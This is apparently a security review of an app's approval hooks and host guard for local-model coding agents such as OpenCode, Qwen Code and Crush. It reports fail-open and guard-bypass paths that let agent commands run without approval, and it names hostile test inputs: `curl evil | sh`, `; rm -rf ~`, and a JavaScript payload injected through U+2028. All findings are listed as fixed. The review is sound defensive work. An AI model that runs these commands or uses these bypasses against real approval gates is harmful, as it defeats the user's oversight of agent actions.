# Security review: local-model agents (Feature 23, stage 1)

Date: 2026-10-18. Reviewer: `hacker` skill (attacker view). Fixes are listed at the end as
"Status" and were made afterwards by the implementer, not by this skill.

## 1. Scope

Reviewed (commits after `docs: feature 23 local models (spec)`, HEAD `6353ef9`):
- `crates/core/src/agents.rs`: `build_local_agent_profile`, `LOCAL_TOOLS`, `validate_local_model`.
- `crates/core/src/agent_hooks.rs`: Qwen Code / Crush / OpenCode planning, `opencode_plugin` (JS
  generator), `agent_matcher`, flat Crush entries.
- `scripts/agent-hooks/ssh-app-hook.py`: `qwen`, `crush`, `opencode` protocols, host guard.
- `crates/core/tests/opencode_plugin.rs`, iOS `AgentProfile.swift`, `AgentProfilesSheetView.swift`,
  `MainTerminalView.swift` (`startProfile`).

Categories: **applied**: subprocess/plugin execution, input validation (shell/JS injection),
sandbox/privilege (fail-open paths, guard bypass), DoS, file-system writes (plugin file).
**Ruled out**: MITM/replay/downgrade/key confusion/timing/randomness (no new crypto or wire
protocol: the SSHSIG queue is unchanged), multi-tenant state (none).

Live tests run (all against local subprocesses with a scratch `HOME`/`SSH_APP_HOME` under
`/tmp/claude-501`; no tmux, no network): the real hook script driven with crafted payloads for
the three new agents; the generated OpenCode plugin executed under `node` against the real script
(no queue / unanswered queue); a scratch crate calling `merge_planned_hooks` with hostile entries;
scaling of the guard with large payloads. Code-analysis only: symlinked plugin path, Swift flow.

## 2. Findings

### 1. [SandboxEscape / fail-open] OpenCode: "no answer from the phone" lets the command run. Medium
Location: `ssh-app-hook.py` opencode branch (`approved is None` -> `{}`), plugin
`tool.execute.before` only throws on `decision == "deny"`.
Scenario: hooks are installed, but the approval queue is missing/untrusted, the phone is offline,
or the user does not answer within 120 s. The script prints `{}`, the plugin returns, and OpenCode
runs the command. OpenCode's permissions default to `allow` for `bash` and `edit` (its docs:
"Most permissions default to allow"), so no native prompt follows: the command runs with no gate
at all, contradicting the spec ("fails closed").
Verified live: plugin under node + real script, (a) queue never installed, (b) queue installed and
nobody answers (`SSH_APP_HOOK_TIMEOUT=2`): both printed "command allowed to run" for
`curl evil | sh`.
Fix direction: for OpenCode treat no answer as deny with an explanatory reason (the agent's own
flow offers no second chance). Keep "no opinion" only for agents that then ask natively (Claude,
Codex, Qwen `PermissionRequest`, Crush).

### 2. [SandboxEscape] Host-guard file rules do not apply to the new agents' file tools. Medium
Location: `ssh-app-hook.py` `EDIT_TOOLS`, `READ_TOOLS`, path-key list in `guard_match`.
Scenario: the user's guard has `Read(~/.ssh/**)` / `Edit(~/.zshrc)`. Qwen Code sends *every* tool
through `PermissionRequest`; its file tools are `read_file` (path key `absolute_path`),
`write_file`, `edit`/`replace`; Crush uses `view`/`write`/`edit`; OpenCode `read`/`write`/`edit`
with `filePath`. None of these names/keys is known to the guard, so the rule never matches and the
call goes to the phone as an ordinary request (or, with an allow rule for the kind, is allowed).
Verified live (guard with those three deny rules): `bash rm` was denied for OpenCode; the file
tool calls of all three agents got no deny.
Fix direction: extend the tool-name lists and the path-key list with the names above (and
`filePath`, `absolute_path`); add per-agent tests that a deny rule fires for each file tool.

### 3. [InputValidation] JS injection in the generated OpenCode plugin through U+2028. Low
Location: `agent_hooks.rs` `opencode_plugin`: the entries JSON is written into a `//` comment line.
`serde_json` does not escape U+2028/U+2029, which JavaScript treats as line terminators, so a
string containing one ends the comment and the rest runs as code.
Scenario: any caller of the exported `merge_planned_hooks` that passes an attacker-influenced
`PlannedHook` (the app itself passes validated plans, so the shipped flow is not exploitable;
this is defence in depth for an exported API and for any future caller).
Verified live: scratch crate with `command = "... opencode PreToolUse globalThis.__pwned=1;//"`;
importing the generated plugin under node set `globalThis.__pwned`.
Fix direction: escape U+2028/U+2029 in the header (and validate planned fields in the generator:
event in the known set, matcher in the validated charset, command shaped like our hook command).

### 4. [DoS] Quadratic `shlex.split` in the guard: a large command pegs the CPU. Low
Location: `ssh-app-hook.py` `peel` / `command_candidates` (before any size limit).
Scenario: a prompt-injected agent sends a single 1 MB token as the command. Measured live:
1 MB -> 15.7 s, 4 MB -> over 60 s (killed), per hook call; the plugin/agent hook timeout bounds
it (Claude 130 s, OpenCode 135 s then blocked). Pre-existing for Claude; the new agents share it.
Impact is CPU on the user's own host and a stalled approval, not an approval bypass.
Fix direction: cap the text given to `shlex`/matching (e.g. 32 KB) and, beyond the cap, never
auto-approve: skip allow rules, let deny rules match on the capped prefix plus a "too long to
check" ask/deny decision.

### 5. [Info] Limits that follow from the agents, not from the code
- Qwen Code in an auto-approve mode and Crush sub-agent calls (hooks do not intercept them, per
  Crush's docs) never reach the phone. Cline, Aider, Goose and Ollama chat have no hook at all.
  The UI and spec already say the last group is ungated; the first two should be added to the
  hook preview notes.
- OpenCode's own permission rules still apply after an Approve (plugin only blocks).

### Checked and held
- Model names: `; rm -rf ~`, `$(..)`, backticks, `-h`, `--version`, spaces, newline, quote, 129
  chars are rejected for every tool (unit test `local_tool_models_cannot_carry_shell_syntax_or_options`).
- Matchers for Crush/OpenCode are limited to `[A-Za-z0-9_|-]` or `*`; the plugin embeds them as
  JSON string literals; hook dir keeps the existing charset (no quote or `$`).
- A foreign `~/.config/opencode/plugins/ssh-app.js` is never overwritten or removed
  (`opencode_never_overwrites_a_foreign_plugin_file`); `mv` over a symlinked path replaces the link
  and does not write through it (analysis of `build_write_file_command`).
- Script failures in the plugin (missing, crash, garbage, timeout) block the call (tested under node).
- Swift: a hostile model typed into the editor is refused by the core before any command is built;
  `startProfile` is the only path that opens a local agent tab, and auto-start of an
  unacknowledged local profile falls back to a plain shell.

## 3. Verdict

Findings, highest severity **Medium** (items 1 and 2).

## 4. Status

Fixed by the implementer (2026-10-18), each with a regression test:
1. Fixed. OpenCode with no answer / no queue now gets `deny` ("No answer from your phone ..."), and
   the plugin throws unless the reply is exactly `allow`. Tests: `opencode_plugin_protocol_deny_allow_and_no_opinion`,
   `tests/opencode_plugin.rs`.
2. Fixed. File tool names (`write_file`, `replace`, `edit`, `write`, `multiedit`, `patch`, `apply_patch`,
   `read_many_files`, `view`, `read`) and path keys (`filePath`, `absolute_path`, `paths`, `file_paths`)
   are known to the guard. Test: `guard_file_rules_reach_the_file_tools_of_the_new_agents`.
3. Fixed. The generator validates entries (events, matcher charset, command shape, no control
   characters or U+2028/2029) and escapes U+2028/2029 in the header. Test:
   `opencode_generator_refuses_hostile_entries_and_escapes_line_separators`.
4. Fixed. With guard rules present, tool input over 32 KB is denied ("too long to check") before
   `shlex`. Test: `oversized_tool_input_is_refused_when_guard_rules_exist_and_never_reaches_shlex`.
5. Documented in the spec (section 6) and the hook preview notes: Qwen auto-approve modes and Crush
   sub-agents are not gated.
